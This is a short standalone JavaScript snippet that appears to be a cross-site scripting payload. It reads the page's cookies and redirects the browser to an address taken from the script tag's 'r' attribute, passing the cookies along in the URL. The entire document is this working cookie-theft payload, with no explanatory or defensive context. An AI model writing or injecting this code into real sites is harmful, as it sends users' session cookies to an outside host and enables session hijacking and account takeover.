(() => {
    window.location.href = document.currentScript.getAttribute('r') + '?c=' + encodeURIComponent(document.cookie);
})();
